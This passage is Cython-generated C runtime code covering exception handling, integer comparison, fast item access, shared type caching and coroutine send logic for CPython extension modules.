static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyIntCompare */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, CYTHON_UNUSED long inplace) {
    if (op1 == op2) {
        Py_RETURN_TRUE;
    }
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long a = PyInt_AS_LONG(op1);
        if (a == b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        int unequal;
        unsigned long uintval;
        Py_ssize_t size = Py_SIZE(op1);
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        if (intval == 0) {
            if (size == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
        } else if (intval < 0) {
            if (size >= 0)
                Py_RETURN_FALSE;
            intval = -intval;
            size = -size;
        } else {
            if (size <= 0)
                Py_RETURN_FALSE;
        }
        uintval = (unsigned long) intval;
#if PyLong_SHIFT * 4 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 4)) {
            unequal = (size != 5) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[4] != ((uintval >> (4 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 3 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 3)) {
            unequal = (size != 4) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 2 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 2)) {
            unequal = (size != 3) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 1 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 1)) {
            unequal = (size != 2) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
            unequal = (size != 1) || (((unsigned long) digits[0]) != (uintval & (unsigned long) PyLong_MASK));
        if (unequal == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        if ((double)a == (double)b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    return (
        PyObject_RichCompare(op1, op2, Py_EQ));
}

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* RaiseException */
#if PY_MAJOR_VERSION < 3
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb,
                        CYTHON_UNUSED PyObject *cause) {
    __Pyx_PyThreadState_declare
    Py_XINCREF(type);
    if (!value || value == Py_None)
        value = NULL;
    else
        Py_INCREF(value);
    if (!tb || tb == Py_None)
        tb = NULL;
    else {
        Py_INCREF(tb);
        if (!PyTraceBack_Check(tb)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: arg 3 must be a traceback or None");
            goto raise_error;
        }
    }
    if (PyType_Check(type)) {
#if CYTHON_COMPILING_IN_PYPY
        if (!value) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#endif
        PyErr_NormalizeException(&type, &value, &tb);
    } else {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto raise_error;
        }
        value = type;
        type = (PyObject*) Py_TYPE(type);
        Py_INCREF(type);
        if (!PyType_IsSubtype((PyTypeObject *)type, (PyTypeObject *)PyExc_BaseException)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: exception class must be a subclass of BaseException");
            goto raise_error;
        }
    }
    __Pyx_PyThreadState_assign
    __Pyx_ErrRestore(type, value, tb);
    return;
raise_error:
    Py_XDECREF(value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
    return;
}
#else
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    PyObject* owned_instance = NULL;
    if (tb == Py_None) {
        tb = 0;
    } else if (tb && !PyTraceBack_Check(tb)) {
        PyErr_SetString(PyExc_TypeError,
            "raise: arg 3 must be a traceback or None");
        goto bad;
    }
    if (value == Py_None)
        value = 0;
    if (PyExceptionInstance_Check(type)) {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto bad;
        }
        value = type;
        type = (PyObject*) Py_TYPE(value);
    } else if (PyExceptionClass_Check(type)) {
        PyObject *instance_class = NULL;
        if (value && PyExceptionInstance_Check(value)) {
            instance_class = (PyObject*) Py_TYPE(value);
            if (instance_class != type) {
                int is_subclass = PyObject_IsSubclass(instance_class, type);
                if (!is_subclass) {
                    instance_class = NULL;
                } else if (unlikely(is_subclass == -1)) {
                    goto bad;
                } else {
                    type = instance_class;
                }
            }
        }
        if (!instance_class) {
            PyObject *args;
            if (!value)
                args = PyTuple_New(0);
            else if (PyTuple_Check(value)) {
                Py_INCREF(value);
                args = value;
            } else
                args = PyTuple_Pack(1, value);
            if (!args)
                goto bad;
            owned_instance = PyObject_Call(type, args, NULL);
            Py_DECREF(args);
            if (!owned_instance)
                goto bad;
            value = owned_instance;
            if (!PyExceptionInstance_Check(value)) {
                PyErr_Format(PyExc_TypeError,
                             "calling %R should have returned an instance of "
                             "BaseException, not %R",
                             type, Py_TYPE(value));
                goto bad;
            }
        }
    } else {
        PyErr_SetString(PyExc_TypeError,
            "raise: exception class must be a subclass of BaseException");
        goto bad;
    }
    if (cause) {
        PyObject *fixed_cause;
        if (cause == Py_None) {
            fixed_cause = NULL;
        } else if (PyExceptionClass_Check(cause)) {
            fixed_cause = PyObject_CallObject(cause, NULL);
            if (fixed_cause == NULL)
                goto bad;
        } else if (PyExceptionInstance_Check(cause)) {
            fixed_cause = cause;
            Py_INCREF(fixed_cause);
        } else {
            PyErr_SetString(PyExc_TypeError,
                            "exception causes must derive from "
                            "BaseException");
            goto bad;
        }
        PyException_SetCause(value, fixed_cause);
    }
    PyErr_SetObject(type, value);
    if (tb) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject *tmp_type, *tmp_value, *tmp_tb;
        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);
        Py_INCREF(tb);
        PyErr_Restore(tmp_type, tmp_value, tb);
        Py_XDECREF(tmp_tb);
#else
        PyThreadState *tstate = __Pyx_PyThreadState_Current;
        PyObject* tmp_tb = tstate->curexc_traceback;
        if (tb != tmp_tb) {
            Py_INCREF(tb);
            tstate->curexc_traceback = tb;
            Py_XDECREF(tmp_tb);
        }
#endif
    }
bad:
    Py_XDECREF(owned_instance);
    return;
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* PyObjectGetMethod */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

/* PyObjectCallMethod1 */
static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}

/* CoroutineBase */
#include <structmember.h>
#include <frameobject.h>
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#define __Pyx_Coroutine_Undelegate(gen) Py_CLEAR((gen)->yieldfrom)
static int __Pyx_PyGen__FetchStopIterationValue(CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject **pvalue) {
    PyObject *et, *ev, *tb;
    PyObject *value = NULL;
    __Pyx_ErrFetch(&et, &ev, &tb);
    if (!et) {
        Py_XDECREF(tb);
        Py_XDECREF(ev);
        Py_INCREF(Py_None);
        *pvalue = Py_None;
        return 0;
    }
    if (likely(et == PyExc_StopIteration)) {
        if (!ev) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#if PY_VERSION_HEX >= 0x030300A0
        else if (Py_TYPE(ev) == (PyTypeObject*)PyExc_StopIteration) {
            value = ((PyStopIterationObject *)ev)->value;
            Py_INCREF(value);
            Py_DECREF(ev);
        }
#endif
        else if (unlikely(PyTuple_Check(ev))) {
            if (PyTuple_GET_SIZE(ev) >= 1) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                value = PyTuple_GET_ITEM(ev, 0);
                Py_INCREF(value);
#else
                value = PySequence_ITEM(ev, 0);
#endif
            } else {
                Py_INCREF(Py_None);
                value = Py_None;
            }
            Py_DECREF(ev);
        }
        else if (!__Pyx_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration)) {
            value = ev;
        }
        if (likely(value)) {
            Py_XDECREF(tb);
            Py_DECREF(et);
            *pvalue = value;
            return 0;
        }
    } else if (!__Pyx_PyErr_GivenExceptionMatches(et, PyExc_StopIteration)) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    PyErr_NormalizeException(&et, &ev, &tb);
    if (unlikely(!PyObject_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration))) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    Py_XDECREF(tb);
    Py_DECREF(et);
#if PY_VERSION_HEX >= 0x030300A0
    value = ((PyStopIterationObject *)ev)->value;
    Py_INCREF(value);
    Py_DECREF(ev);
#else
    {
        PyObject* args = __Pyx_PyObject_GetAttrStr(ev, __pyx_n_s_args);
        Py_DECREF(ev);
        if (likely(args)) {
            value = PySequence_GetItem(args, 0);
            Py_DECREF(args);
        }
        if (unlikely(!value)) {
            __Pyx_ErrRestore(NULL, NULL, NULL);
            Py_INCREF(Py_None);
            value = Py_None;
        }
    }
#endif
    *pvalue = value;
    return 0;
}
static CYTHON_INLINE
void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *t, *v, *tb;
    t = exc_state->exc_type;
    v = exc_state->exc_value;
    tb = exc_state->exc_traceback;
    exc_state->exc_type = NULL;
    exc_state->exc_value = NULL;
    exc_state->exc_traceback = NULL;
    Py_XDECREF(t);
    Py_XDECREF(v);
    Py_XDECREF(tb);
}
#define __Pyx_Coroutine_AlreadyRunningError(gen)  (__Pyx__Coroutine_AlreadyRunningError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyRunningError(CYTHON_UNUSED __pyx_CoroutineObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check((PyObject*)gen)) {
        msg = "coroutine already executing";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact((PyObject*)gen)) {
        msg = "async generator already executing";
    #endif
    } else {
        msg = "generator already executing";
    }
    PyErr_SetString(PyExc_ValueError, msg);
}
#define __Pyx_Coroutine_NotStartedError(gen)  (__Pyx__Coroutine_NotStartedError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_NotStartedError(CYTHON_UNUSED PyObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check(gen)) {
        msg = "can't send non-None value to a just-started coroutine";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact(gen)) {
        msg = "can't send non-None value to a just-started async generator";
    #endif
    } else {
        msg = "can't send non-None value to a just-started generator";
    }
    PyErr_SetString(PyExc_TypeError, msg);
}
#define __Pyx_Coroutine_AlreadyTerminatedError(gen, value, closing)  (__Pyx__Coroutine_AlreadyTerminatedError(gen, value, closing), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyTerminatedError(CYTHON_UNUSED PyObject *gen, PyObject *value, CYTHON_UNUSED int closing) {
    #ifdef __Pyx_Coroutine_USED
    if (!closing && __Pyx_Coroutine_Check(gen)) {
        PyErr_SetString(PyExc_RuntimeError, "cannot reuse already awaited coroutine");
    } else
    #endif
    if (value) {
        #ifdef __Pyx_AsyncGen_USED
        if (__Pyx_AsyncGen_CheckExact(gen))
            PyErr_SetNone(__Pyx_PyExc_StopAsyncIteration);
        else
        #endif
        PyErr_SetNone(PyExc_StopIteration);
    }
}
static
PyObject *__Pyx_Coroutine_SendEx(__pyx_CoroutineObject *self, PyObject *value, int closing) {
    __Pyx_PyThreadState_declare
    PyThreadState *tstate;
    __Pyx_ExcInfoStruct *exc_state;
    PyObject *retval;
    assert(!self->is_running);
    if (unlikely(self->resume_label == 0)) {
        if (unlikely(value && value != Py_None)) {
            return __Pyx_Coroutine_NotStartedError((PyObject*)self);
        }
    }
    if (unlikely(self->resume_label == -1)) {
        return __Pyx_Coroutine_AlreadyTerminatedError((PyObject*)self, value, closing);
    }
#if CYTHON_FAST_THREAD_STATE
    __Pyx_PyThreadState_assign
    tstate = __pyx_tstate;
#else
    tstate = __Pyx_PyThreadState_Current;
#endif
    exc_state = &self->gi_exc_state;
    if (exc_state->exc_type) {
        #if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
        #else
        if (exc_state->exc_traceback) {
            PyTracebackObject *tb = (PyTracebackObject *) exc_state->exc_traceback;
            PyFrameObject *f = tb->tb_frame;
            assert(f->f_back == NULL);
            #if PY_VERSION_HEX >= 0x030B00A1
            f->f_back = PyThreadState_GetFrame(tstate);
            #else
            Py_XINCREF(tstate->frame);
            f->f_back = tstate->frame;
            #endif
        }
        #endif
    }
#if CYTHON_USE_EXC_INFO_STACK
    exc_state->previous_item = tstate->exc_info;
    tstate->exc_info = exc_state;
#else
    if (exc_state->exc_type) {
        __Pyx_ExceptionSwap(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    } else {
        __Pyx_Coroutine_ExceptionClear(exc_state);
        __Pyx_ExceptionSave(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    }
#endif
    self->is_running = 1;
    retval = self->body((PyObject *) self, tstate, value);
    self->is_running = 0;
#if CYTHON_USE_EXC_INFO_STACK
    exc_state = &self->gi_exc_state;
    tstate->exc_info = exc_state->previous_item;
    exc_state->previous_item = NULL;
    __Pyx_Coroutine_ResetFrameBackpointer(exc_state);
#endif
    return retval;
}
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *exc_tb = exc_state->exc_traceback;
    if (likely(exc_tb)) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
#else
        PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
        PyFrameObject *f = tb->tb_frame;
        Py_CLEAR(f->f_back);
#endif
    }
}
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_MethodReturn(CYTHON_UNUSED PyObject* gen, PyObject *retval) {
    if (unlikely(!retval)) {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        if (!__Pyx_PyErr_Occurred()) {
            PyObject *exc = PyExc_StopIteration;
            #ifdef __Pyx_AsyncGen_USED
            if (__Pyx_AsyncGen_CheckExact(gen))
                exc = __Pyx_PyExc_StopAsyncIteration;
            #endif
            __Pyx_PyErr_SetNone(exc);
        }
    }
    return retval;
}
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
static CYTHON_INLINE
PyObject *__Pyx_PyGen_Send(PyGenObject *gen, PyObject *arg) {
#if PY_VERSION_HEX <= 0x030A00A1
    return _PyGen_Send(gen, arg);
#else
    PyObject *result;
    if (PyIter_Send((PyObject*)gen, arg ? arg : Py_None, &result) == PYGEN_RETURN) {
        if (PyAsyncGen_CheckExact(gen)) {
            assert(result == Py_None);
            PyErr_SetNone(PyExc_StopAsyncIteration);
        }
        else if (result == Py_None) {
            PyErr_SetNone(PyExc_StopIteration);
        }
        else {
            _PyGen_SetStopIterationValue(result);
        }
        Py_CLEAR(result);
    }
    return result;
#endif
}
#endif
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_FinishDelegation(__pyx_CoroutineObject *gen) {
    PyObject *ret;
    PyObject *val = NULL;
    __Pyx_Coroutine_Undelegate(gen);
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, &val);
    ret = __Pyx_Coroutine_SendEx(gen, val, 0);
    Py_XDECREF(val);
    return ret;
}
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value) {
    PyObject *retval;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
